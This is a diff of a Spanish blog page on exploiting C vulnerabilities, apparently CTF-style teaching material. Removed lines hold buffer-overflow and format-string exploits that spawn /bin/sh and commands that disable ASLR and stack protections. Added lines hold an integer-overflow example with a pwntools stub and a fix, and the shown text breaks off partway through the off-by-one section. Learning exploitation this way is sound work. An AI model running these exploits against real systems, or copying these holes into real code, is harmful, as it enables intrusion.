@@ -9,7 +9,8 @@
   <meta property="og:url" content="https://imlauera.github.io/how_easy_is_to_hack_c/">
 	<meta property="og:site_name" content="Imlauer">
 	<meta property="og:title" content="How easy is to hack C">
-	<meta property="og:description" content="Vulnerabilidades en C y sus Exploits Flujo de trabajo para explotar cada vulnerabilidad Herramientas esenciales # Instalar pwntools (la navaja suiza del exploitation) pip install pwntools # GDB con pwndbg para debugging sudo apt install gdb git clone https://github.com/pwndbg/pwndbg &amp;&amp; cd pwndbg &amp;&amp; ./setup.sh # Verificar protecciones de un binario checksec --file=./vuln_bof Flags de compilación y qué deshabilitan Flag Protección que elimina -fno-stack-protector Stack canary (valor mágico que detecta BOF) -no-pie PIE/ASLR relativo (randomiza base del binario) -z execstack NX bit (permite ejecutar shellcode en el stack) -D_FORTIFY_SOURCE=0 Fortify (checks de funciones de string) echo 0 &gt; /proc/sys/kernel/randomize_va_space ASLR del sistema completo 1. Buffer Overflow (CWE-121) Código vulnerable // vuln_bof.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; void secret() { printf(&#34;¡Ganaste! RIP redirigido\n&#34;); system(&#34;/bin/sh&#34;); } void vulnerable(char *input) { char buf[64]; // buffer fijo strcpy(buf, input); // ← SIN verificar largo printf(&#34;Hola: %s\n&#34;, buf); } int main(int argc, char **argv) { vulnerable(argv[1]); return 0; } Exploit en Python # exploit_bof.py import subprocess import struct # 1. Buscar offset con pattern # gdb: pattern create 100 # run $(python3 -c &#34;print(&#39;Aa0A...&#39;)&#34;) # pattern offset $rip OFFSET = 72 # 64 buf &#43; 8 saved rbp # 2. Dirección de secret() # gdb: p secret → 0x401136 SECRET_ADDR = 0x401136 payload = b&#34;A&#34; * OFFSET payload &#43;= struct.pack(&#34;&lt;Q&#34;, SECRET_ADDR) print(payload.decode(&#34;latin-1&#34;)) Mapa de memoria del stack 0x7fff...10 [ buf[0..63] — 64 bytes ] ← inicio del buffer 0x7fff...50 [ saved RBP — 8 bytes ] 0x7fff...58 [ return address (RIP) ] ← target ↑ con overflow: A×72 &#43; &lt;addr secret&gt; overflow [ AAAA...AAAA &#43; \x36\x11\x40\x00... ] ← sobrescribe RIP Compilar y explotar gcc -o vuln_bof vuln_bof.c -fno-stack-protector -no-pie -z execstack ./vuln_bof $(python3 exploit_bof.py) gdb vuln_bof # para encontrar offset y dirección Cómo funciona el ataque strcpy no verifica largo — copia hasta encontrar \0, sin importar si hay espacio. Se sobreescribe la memoria adyacente — saved RBP y luego el return address (RIP). Al retornar la función, la CPU hace pop rip y salta a la dirección que pusimos. Ejecución redirigida a secret() que ejecuta /bin/sh. 2. Format String (CWE-134) Código vulnerable // vuln_fmtstr.c #include &lt;stdio.h&gt; int target = 0; int main(int argc, char **argv) { printf(&#34;target está en: %p\n&#34;, &amp;target); // ← VULNERABLE: el user controla el format string printf(argv[1]); printf(&#34;\ntarget = %d\n&#34;, target); if (target == 0x1337) { printf(&#34;¡Flag!\n&#34;); system(&#34;/bin/sh&#34;); } return 0; } Exploit en Python # exploit_fmtstr.py import subprocess from struct import pack # Paso 1: leer memoria con %p # ./vuln &#34;AAAA %p %p %p %p %p %p&#34; # Encontrar en qué posición aparece 0x41414141 # → esa es la posición directa: %N$ TARGET = 0x404048 # dirección de &#39;target&#39; VALUE = 0x1337 # valor a escribir (4919) # %N$n escribe N bytes impresos en la dirección # que está en el argumento N del stack # Usamos pwntools para facilitar: # from pwn import fmtstr_payload # payload = fmtstr_payload(6, {TARGET: VALUE}) # Manual: addr = pack(&#34;&lt;Q&#34;, TARGET) # Imprimir (VALUE - 8) caracteres, luego %6$n payload = addr &#43; b&#34;%4903c%6$n&#34; print(payload) Primitivas de lectura y escritura Leer memoria:">
+	<meta property="og:description" content="Vulnerabilidades Clásicas en C — Guía Completa Basado en CWE Top 25 (MITRE/CISA 2025) &#43; técnicas de CTF y explotación binaria. Cada entrada incluye: código vulnerable, mecanismo del ataque, exploit y cómo compilar.
+Índice Integer Overflow → Heap Overflow Off-By-One gets() — función removida con razón Uninitialized Memory Null Pointer Dereference Dangling Pointer a Variable Local Heap Overflow (directo) Stack Overflow via Recursión Race Condition / TOCTOU Signed/Unsigned Mismatch Out-of-Bounds Read (OOB Read) Improper String Termination Type Confusion Signal Handler Reentrancy Path Traversal / Directory Traversal 1. Integer Overflow → Heap Overflow CWE-190 / CWE-122 — Crítico">
 	<meta property="og:locale" content="es_es">
 	<meta property="og:type" content="article">
 		<meta property="article:published_time" content="2026-06-16T20:42:27-03:00">
@@ -18,15 +19,17 @@
 
   
 	<meta itemprop="name" content="How easy is to hack C">
-	<meta itemprop="description" content="Vulnerabilidades en C y sus Exploits Flujo de trabajo para explotar cada vulnerabilidad Herramientas esenciales # Instalar pwntools (la navaja suiza del exploitation) pip install pwntools # GDB con pwndbg para debugging sudo apt install gdb git clone https://github.com/pwndbg/pwndbg &amp;&amp; cd pwndbg &amp;&amp; ./setup.sh # Verificar protecciones de un binario checksec --file=./vuln_bof Flags de compilación y qué deshabilitan Flag Protección que elimina -fno-stack-protector Stack canary (valor mágico que detecta BOF) -no-pie PIE/ASLR relativo (randomiza base del binario) -z execstack NX bit (permite ejecutar shellcode en el stack) -D_FORTIFY_SOURCE=0 Fortify (checks de funciones de string) echo 0 &gt; /proc/sys/kernel/randomize_va_space ASLR del sistema completo 1. Buffer Overflow (CWE-121) Código vulnerable // vuln_bof.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; void secret() { printf(&#34;¡Ganaste! RIP redirigido\n&#34;); system(&#34;/bin/sh&#34;); } void vulnerable(char *input) { char buf[64]; // buffer fijo strcpy(buf, input); // ← SIN verificar largo printf(&#34;Hola: %s\n&#34;, buf); } int main(int argc, char **argv) { vulnerable(argv[1]); return 0; } Exploit en Python # exploit_bof.py import subprocess import struct # 1. Buscar offset con pattern # gdb: pattern create 100 # run $(python3 -c &#34;print(&#39;Aa0A...&#39;)&#34;) # pattern offset $rip OFFSET = 72 # 64 buf &#43; 8 saved rbp # 2. Dirección de secret() # gdb: p secret → 0x401136 SECRET_ADDR = 0x401136 payload = b&#34;A&#34; * OFFSET payload &#43;= struct.pack(&#34;&lt;Q&#34;, SECRET_ADDR) print(payload.decode(&#34;latin-1&#34;)) Mapa de memoria del stack 0x7fff...10 [ buf[0..63] — 64 bytes ] ← inicio del buffer 0x7fff...50 [ saved RBP — 8 bytes ] 0x7fff...58 [ return address (RIP) ] ← target ↑ con overflow: A×72 &#43; &lt;addr secret&gt; overflow [ AAAA...AAAA &#43; \x36\x11\x40\x00... ] ← sobrescribe RIP Compilar y explotar gcc -o vuln_bof vuln_bof.c -fno-stack-protector -no-pie -z execstack ./vuln_bof $(python3 exploit_bof.py) gdb vuln_bof # para encontrar offset y dirección Cómo funciona el ataque strcpy no verifica largo — copia hasta encontrar \0, sin importar si hay espacio. Se sobreescribe la memoria adyacente — saved RBP y luego el return address (RIP). Al retornar la función, la CPU hace pop rip y salta a la dirección que pusimos. Ejecución redirigida a secret() que ejecuta /bin/sh. 2. Format String (CWE-134) Código vulnerable // vuln_fmtstr.c #include &lt;stdio.h&gt; int target = 0; int main(int argc, char **argv) { printf(&#34;target está en: %p\n&#34;, &amp;target); // ← VULNERABLE: el user controla el format string printf(argv[1]); printf(&#34;\ntarget = %d\n&#34;, target); if (target == 0x1337) { printf(&#34;¡Flag!\n&#34;); system(&#34;/bin/sh&#34;); } return 0; } Exploit en Python # exploit_fmtstr.py import subprocess from struct import pack # Paso 1: leer memoria con %p # ./vuln &#34;AAAA %p %p %p %p %p %p&#34; # Encontrar en qué posición aparece 0x41414141 # → esa es la posición directa: %N$ TARGET = 0x404048 # dirección de &#39;target&#39; VALUE = 0x1337 # valor a escribir (4919) # %N$n escribe N bytes impresos en la dirección # que está en el argumento N del stack # Usamos pwntools para facilitar: # from pwn import fmtstr_payload # payload = fmtstr_payload(6, {TARGET: VALUE}) # Manual: addr = pack(&#34;&lt;Q&#34;, TARGET) # Imprimir (VALUE - 8) caracteres, luego %6$n payload = addr &#43; b&#34;%4903c%6$n&#34; print(payload) Primitivas de lectura y escritura Leer memoria:">
+	<meta itemprop="description" content="Vulnerabilidades Clásicas en C — Guía Completa Basado en CWE Top 25 (MITRE/CISA 2025) &#43; técnicas de CTF y explotación binaria. Cada entrada incluye: código vulnerable, mecanismo del ataque, exploit y cómo compilar.
+Índice Integer Overflow → Heap Overflow Off-By-One gets() — función removida con razón Uninitialized Memory Null Pointer Dereference Dangling Pointer a Variable Local Heap Overflow (directo) Stack Overflow via Recursión Race Condition / TOCTOU Signed/Unsigned Mismatch Out-of-Bounds Read (OOB Read) Improper String Termination Type Confusion Signal Handler Reentrancy Path Traversal / Directory Traversal 1. Integer Overflow → Heap Overflow CWE-190 / CWE-122 — Crítico">
 	<meta itemprop="datePublished" content="2026-06-16T20:42:27-03:00">
 	<meta itemprop="dateModified" content="2026-06-16T20:42:27-03:00">
-	<meta itemprop="wordCount" content="3062">
+	<meta itemprop="wordCount" content="7654">
 	<meta itemprop="keywords" content="C">
   
 	<meta name="twitter:card" content="summary">
 	<meta name="twitter:title" content="How easy is to hack C">
-	<meta name="twitter:description" content="Vulnerabilidades en C y sus Exploits Flujo de trabajo para explotar cada vulnerabilidad Herramientas esenciales # Instalar pwntools (la navaja suiza del exploitation) pip install pwntools # GDB con pwndbg para debugging sudo apt install gdb git clone https://github.com/pwndbg/pwndbg &amp;&amp; cd pwndbg &amp;&amp; ./setup.sh # Verificar protecciones de un binario checksec --file=./vuln_bof Flags de compilación y qué deshabilitan Flag Protección que elimina -fno-stack-protector Stack canary (valor mágico que detecta BOF) -no-pie PIE/ASLR relativo (randomiza base del binario) -z execstack NX bit (permite ejecutar shellcode en el stack) -D_FORTIFY_SOURCE=0 Fortify (checks de funciones de string) echo 0 &gt; /proc/sys/kernel/randomize_va_space ASLR del sistema completo 1. Buffer Overflow (CWE-121) Código vulnerable // vuln_bof.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; void secret() { printf(&#34;¡Ganaste! RIP redirigido\n&#34;); system(&#34;/bin/sh&#34;); } void vulnerable(char *input) { char buf[64]; // buffer fijo strcpy(buf, input); // ← SIN verificar largo printf(&#34;Hola: %s\n&#34;, buf); } int main(int argc, char **argv) { vulnerable(argv[1]); return 0; } Exploit en Python # exploit_bof.py import subprocess import struct # 1. Buscar offset con pattern # gdb: pattern create 100 # run $(python3 -c &#34;print(&#39;Aa0A...&#39;)&#34;) # pattern offset $rip OFFSET = 72 # 64 buf &#43; 8 saved rbp # 2. Dirección de secret() # gdb: p secret → 0x401136 SECRET_ADDR = 0x401136 payload = b&#34;A&#34; * OFFSET payload &#43;= struct.pack(&#34;&lt;Q&#34;, SECRET_ADDR) print(payload.decode(&#34;latin-1&#34;)) Mapa de memoria del stack 0x7fff...10 [ buf[0..63] — 64 bytes ] ← inicio del buffer 0x7fff...50 [ saved RBP — 8 bytes ] 0x7fff...58 [ return address (RIP) ] ← target ↑ con overflow: A×72 &#43; &lt;addr secret&gt; overflow [ AAAA...AAAA &#43; \x36\x11\x40\x00... ] ← sobrescribe RIP Compilar y explotar gcc -o vuln_bof vuln_bof.c -fno-stack-protector -no-pie -z execstack ./vuln_bof $(python3 exploit_bof.py) gdb vuln_bof # para encontrar offset y dirección Cómo funciona el ataque strcpy no verifica largo — copia hasta encontrar \0, sin importar si hay espacio. Se sobreescribe la memoria adyacente — saved RBP y luego el return address (RIP). Al retornar la función, la CPU hace pop rip y salta a la dirección que pusimos. Ejecución redirigida a secret() que ejecuta /bin/sh. 2. Format String (CWE-134) Código vulnerable // vuln_fmtstr.c #include &lt;stdio.h&gt; int target = 0; int main(int argc, char **argv) { printf(&#34;target está en: %p\n&#34;, &amp;target); // ← VULNERABLE: el user controla el format string printf(argv[1]); printf(&#34;\ntarget = %d\n&#34;, target); if (target == 0x1337) { printf(&#34;¡Flag!\n&#34;); system(&#34;/bin/sh&#34;); } return 0; } Exploit en Python # exploit_fmtstr.py import subprocess from struct import pack # Paso 1: leer memoria con %p # ./vuln &#34;AAAA %p %p %p %p %p %p&#34; # Encontrar en qué posición aparece 0x41414141 # → esa es la posición directa: %N$ TARGET = 0x404048 # dirección de &#39;target&#39; VALUE = 0x1337 # valor a escribir (4919) # %N$n escribe N bytes impresos en la dirección # que está en el argumento N del stack # Usamos pwntools para facilitar: # from pwn import fmtstr_payload # payload = fmtstr_payload(6, {TARGET: VALUE}) # Manual: addr = pack(&#34;&lt;Q&#34;, TARGET) # Imprimir (VALUE - 8) caracteres, luego %6$n payload = addr &#43; b&#34;%4903c%6$n&#34; print(payload) Primitivas de lectura y escritura Leer memoria:">
+	<meta name="twitter:description" content="Vulnerabilidades Clásicas en C — Guía Completa Basado en CWE Top 25 (MITRE/CISA 2025) &#43; técnicas de CTF y explotación binaria. Cada entrada incluye: código vulnerable, mecanismo del ataque, exploit y cómo compilar.
+Índice Integer Overflow → Heap Overflow Off-By-One gets() — función removida con razón Uninitialized Memory Null Pointer Dereference Dangling Pointer a Variable Local Heap Overflow (directo) Stack Overflow via Recursión Race Condition / TOCTOU Signed/Unsigned Mismatch Out-of-Bounds Read (OOB Read) Improper String Termination Type Confusion Signal Handler Reentrancy Path Traversal / Directory Traversal 1. Integer Overflow → Heap Overflow CWE-190 / CWE-122 — Crítico">
 
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -44,159 +47,33 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="referrer" content="no-referrer">
   <meta name="author" content="Imlauer.">
-  <meta name="description" content="Vulnerabilidades en C y sus Exploits
-Flujo de trabajo para explotar cada vulnerabilidad
+  <meta name="description" content="Vulnerabilidades Clásicas en C — Guía Completa
 
-Herramientas esenciales
-# Instalar pwntools (la navaja suiza del exploitation)
-pip install pwntools
-
-# GDB con pwndbg para debugging
-sudo apt install gdb
-git clone https://github.com/pwndbg/pwndbg &amp;&amp; cd pwndbg &amp;&amp; ./setup.sh
-
-# Verificar protecciones de un binario
-checksec --file=./vuln_bof
-
-Flags de compilación y qué deshabilitan
-
-	
-			
-					Flag
-					Protección que elimina
-			
-	
-	
-			
-					-fno-stack-protector
-					Stack canary (valor mágico que detecta BOF)
-			
-			
-					-no-pie
-					PIE/ASLR relativo (randomiza base del binario)
-			
-			
-					-z execstack
-					NX bit (permite ejecutar shellcode en el stack)
-			
-			
-					-D_FORTIFY_SOURCE=0
-					Fortify (checks de funciones de string)
-			
-			
-					echo 0 &gt; /proc/sys/kernel/randomize_va_space
-					ASLR del sistema completo
-			
-	
+Basado en CWE Top 25 (MITRE/CISA 2025) &#43; técnicas de CTF y explotación binaria.
+Cada entrada incluye: código vulnerable, mecanismo del ataque, exploit y cómo compilar.
 
 
-1. Buffer Overflow (CWE-121)
-Código vulnerable
-// vuln_bof.c
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
+Índice
 
-void secret() {
-    printf(&#34;¡Ganaste! RIP redirigido\n&#34;);
-    system(&#34;/bin/sh&#34;);
-}
-
-void vulnerable(char *input) {
-    char buf[64];         // buffer fijo
-    strcpy(buf, input);   // ← SIN verificar largo
-    printf(&#34;Hola: %s\n&#34;, buf);
-}
-
-int main(int argc, char **argv) {
-    vulnerable(argv[1]);
-    return 0;
-}
-Exploit en Python
-# exploit_bof.py
-import subprocess
-import struct
-
-# 1. Buscar offset con pattern
-#    gdb: pattern create 100
-#    run $(python3 -c &#34;print(&#39;Aa0A...&#39;)&#34;)
-#    pattern offset $rip
-
-OFFSET = 72   # 64 buf &#43; 8 saved rbp
-
-# 2. Dirección de secret()
-#    gdb: p secret → 0x401136
-SECRET_ADDR = 0x401136
-
-payload = b&#34;A&#34; * OFFSET
-payload &#43;= struct.pack(&#34;&lt;Q&#34;, SECRET_ADDR)
-
-print(payload.decode(&#34;latin-1&#34;))
-Mapa de memoria del stack
-0x7fff...10  [ buf[0..63] — 64 bytes        ]  ← inicio del buffer
-0x7fff...50  [ saved RBP  — 8 bytes         ]
-0x7fff...58  [ return address (RIP)         ]  ← target
-             ↑ con overflow: A×72 &#43; &lt;addr secret&gt;
-overflow     [ AAAA...AAAA &#43; \x36\x11\x40\x00... ]  ← sobrescribe RIP
-Compilar y explotar
-gcc -o vuln_bof vuln_bof.c -fno-stack-protector -no-pie -z execstack
-./vuln_bof $(python3 exploit_bof.py)
-gdb vuln_bof   # para encontrar offset y dirección
-Cómo funciona el ataque
-
-strcpy no verifica largo — copia hasta encontrar \0, sin importar si hay espacio.
-Se sobreescribe la memoria adyacente — saved RBP y luego el return address (RIP).
-Al retornar la función, la CPU hace pop rip y salta a la dirección que pusimos.
-Ejecución redirigida a secret() que ejecuta /bin/sh.
+Integer Overflow → Heap Overflow
+Off-By-One
+gets() — función removida con razón
+Uninitialized Memory
+Null Pointer Dereference
+Dangling Pointer a Variable Local
+Heap Overflow (directo)
+Stack Overflow via Recursión
+Race Condition / TOCTOU
+Signed/Unsigned Mismatch
+Out-of-Bounds Read (OOB Read)
+Improper String Termination
+Type Confusion
+Signal Handler Reentrancy
+Path Traversal / Directory Traversal
 
 
-2. Format String (CWE-134)
-Código vulnerable
-// vuln_fmtstr.c
-#include &lt;stdio.h&gt;
-
-int target = 0;
-
-int main(int argc, char **argv) {
-    printf(&#34;target está en: %p\n&#34;, &amp;target);
-
-    // ← VULNERABLE: el user controla el format string
-    printf(argv[1]);
-
-    printf(&#34;\ntarget = %d\n&#34;, target);
-
-    if (target == 0x1337) {
-        printf(&#34;¡Flag!\n&#34;);
-        system(&#34;/bin/sh&#34;);
-    }
-    return 0;
-}
-Exploit en Python
-# exploit_fmtstr.py
-import subprocess
-from struct import pack
-
-# Paso 1: leer memoria con %p
-# ./vuln &#34;AAAA %p %p %p %p %p %p&#34;
-# Encontrar en qué posición aparece 0x41414141
-# → esa es la posición directa: %N$
-
-TARGET = 0x404048  # dirección de &#39;target&#39;
-VALUE  = 0x1337   # valor a escribir (4919)
-
-# %N$n escribe N bytes impresos en la dirección
-# que está en el argumento N del stack
-
-# Usamos pwntools para facilitar:
-# from pwn import fmtstr_payload
-# payload = fmtstr_payload(6, {TARGET: VALUE})
-
-# Manual:
-addr = pack(&#34;&lt;Q&#34;, TARGET)
-# Imprimir (VALUE - 8) caracteres, luego %6$n
-payload = addr &#43; b&#34;%4903c%6$n&#34;
-print(payload)
-Primitivas de lectura y escritura
-Leer memoria:">
+1. Integer Overflow → Heap Overflow
+CWE-190 / CWE-122 — Crítico">
 </head>
 <body><nav class="navbar is-transparent " role="navigation" aria-label="main navigation">
   <div class="navbar-brand">
@@ -244,7 +121,1202 @@ Leer memoria:">
     <section class="section">
       <div class="container">
 <div class="content is-medium">
-  <h1 id="vulnerabilidades-en-c-y-sus-exploits">Vulnerabilidades en C y sus Exploits</h1>
+  <h1 id="vulnerabilidades-clásicas-en-c--guía-completa">Vulnerabilidades Clásicas en C — Guía Completa</h1>
+<blockquote>
+<p>Basado en CWE Top 25 (MITRE/CISA 2025) + técnicas de CTF y explotación binaria.
+Cada entrada incluye: código vulnerable, mecanismo del ataque, exploit y cómo compilar.</p>
+</blockquote>
+<hr>
+<h2 id="índice">Índice</h2>
+<ol>
+<li><a href="#1-integer-overflow--heap-overflow">Integer Overflow → Heap Overflow</a></li>
+<li><a href="#2-off-by-one">Off-By-One</a></li>
+<li><a href="#3-gets--funci%C3%B3n-removida-con-raz%C3%B3n">gets() — función removida con razón</a></li>
+<li><a href="#4-uninitialized-memory">Uninitialized Memory</a></li>
+<li><a href="#5-null-pointer-dereference">Null Pointer Dereference</a></li>
+<li><a href="#6-dangling-pointer-a-variable-local">Dangling Pointer a Variable Local</a></li>
+<li><a href="#7-heap-overflow-directo">Heap Overflow (directo)</a></li>
+<li><a href="#8-stack-overflow-via-recursi%C3%B3n">Stack Overflow via Recursión</a></li>
+<li><a href="#9-race-condition--toctou">Race Condition / TOCTOU</a></li>
+<li><a href="#10-signedunsigned-mismatch">Signed/Unsigned Mismatch</a></li>
+<li><a href="#11-out-of-bounds-read-oob-read">Out-of-Bounds Read (OOB Read)</a></li>
+<li><a href="#12-improper-string-termination">Improper String Termination</a></li>
+<li><a href="#13-type-confusion">Type Confusion</a></li>
+<li><a href="#14-signal-handler-reentrancy">Signal Handler Reentrancy</a></li>
+<li><a href="#15-path-traversal--directory-traversal">Path Traversal / Directory Traversal</a></li>
+</ol>
+<hr>
+<h2 id="1-integer-overflow--heap-overflow">1. Integer Overflow → Heap Overflow</h2>
+<p><strong>CWE-190 / CWE-122</strong> — Crítico</p>
+<h3 id="mecanismo">Mecanismo</h3>
+<p>Un entero con signo o sin signo desborda al hacer aritmética, produciendo un valor muy pequeño.
+Si ese valor se usa en <code>malloc()</code>, se aloca un buffer chico. Luego se escribe fuera de él.</p>
+<h3 id="código-vulnerable">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_intoverflow.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">process</span>(<span style="color:#66d9ef">int</span> n, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// n controlado por usuario
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Si n = 0x40000001: n * 4 = 0x100000004 → trunca a 4 en 32 bits
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(n <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>));   <span style="color:#75715e">// malloc(4) — buffer diminuto
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>buf) { <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;malloc falló&#34;</span>); <span style="color:#66d9ef">return</span>; }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Pero escribe n enteros → heap overflow
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> n; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>        buf[i] <span style="color:#f92672">=</span> i;                       <span style="color:#75715e">// 💥 escribe mucho más allá del buffer
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Corrupción de metadata del heap → arbitrary write
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> n <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">process</span>(n, argv[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="por-qué-ocurre">Por qué ocurre</h3>
+<pre tabindex="0"><code>n = 1073741825  (0x40000001)
+n * sizeof(int) = 0x40000001 * 4 = 0x100000004
+En sistemas 32-bit o con int de 32 bits: trunca a 0x4 → malloc(4)
+Pero el loop escribe 1073741825 enteros → desborda el heap
+</code></pre><h3 id="exploit-en-python">Exploit en Python</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_intof.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># El overflow corrompe el chunk header del siguiente bloque en el heap</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Técnica: house of force o fastbin dup según glibc version</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;./vuln_intoverflow&#39;</span>, str(<span style="color:#ae81ff">0x40000001</span>), <span style="color:#e6db74">&#39;X&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># n = 0x40000001 → malloc(4) → loop escribe 4GB de ints</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Corrompe el &#39;size&#39; field del siguiente chunk</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Permite controlar qué devuelve el próximo malloc()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="cómo-compilar">Cómo compilar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># En 32 bits para ver el truncamiento más claramente</span>
+</span></span><span style="display:flex;"><span>gcc -m32 -o vuln_intoverflow vuln_intoverflow.c -fno-stack-protector -no-pie
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Verificar con:</span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;print(1073741825 * 4 % 2**32)&#34;</span>   <span style="color:#75715e"># → 4</span>
+</span></span></code></pre></div><h3 id="fix">Fix</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Validar ANTES de multiplicar
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (n <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> n <span style="color:#f92672">&gt;</span> MAX_ALLOWED) { <span style="color:#a6e22e">error</span>(); <span style="color:#66d9ef">return</span>; }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">size_t</span>)n <span style="color:#f92672">&gt;</span> SIZE_MAX <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>)) { <span style="color:#a6e22e">error</span>(); <span style="color:#66d9ef">return</span>; }  <span style="color:#75715e">// overflow check
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>((<span style="color:#66d9ef">size_t</span>)n <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>));
+</span></span></code></pre></div><hr>
+<h2 id="2-off-by-one">2. Off-By-One</h2>
+<p><strong>CWE-193</strong> — Alto</p>
+<h3 id="mecanismo-1">Mecanismo</h3>
+<p>El loop usa <code>&lt;=</code> en vez de <code>&lt;</code>, o se calcula mal el espacio de un terminador <code>\0</code>.
+Se sobrescribe exactamente 1 byte fuera del buffer.
+En el stack, ese byte puede ser el byte bajo del saved RBP o un canary.</p>
+<h3 id="código-vulnerable-1">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_obo.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>input) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">10</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 💥 &lt;= en vez de &lt; → escribe buf[10] que no existe
